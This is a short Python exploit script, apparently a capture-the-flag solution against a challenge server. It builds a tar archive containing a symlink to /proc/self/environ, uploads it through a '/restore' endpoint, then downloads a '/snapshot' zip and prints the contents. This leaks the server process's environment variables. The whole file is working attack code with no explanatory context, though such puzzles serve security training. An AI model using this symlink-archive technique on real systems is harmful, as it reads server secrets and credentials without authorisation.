import io
import tarfile
import zipfile
import requests

URL = "http://chal.thjcc.org:9005"
TARGETS = {
    "67": "/proc/self/environ",
}

def build_tar() -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        for name, target in TARGETS.items():
            ti = tarfile.TarInfo(name)
            ti.type = tarfile.SYMTYPE
            ti.linkname = target
            tf.addfile(ti)

    # write into disk
    with open("a.tar", "wb") as f:
        f.write(buf.getvalue())
    return buf.getvalue()

with requests.Session() as s:
    s.post(URL + "/restore", files={"archive": ("a.tar", build_tar())})
    snap = s.get(URL + "/snapshot").content

with zipfile.ZipFile(io.BytesIO(snap)) as z:
    for name in z.namelist():
        body = z.read(name)
        print(body.decode(errors='ignore'))
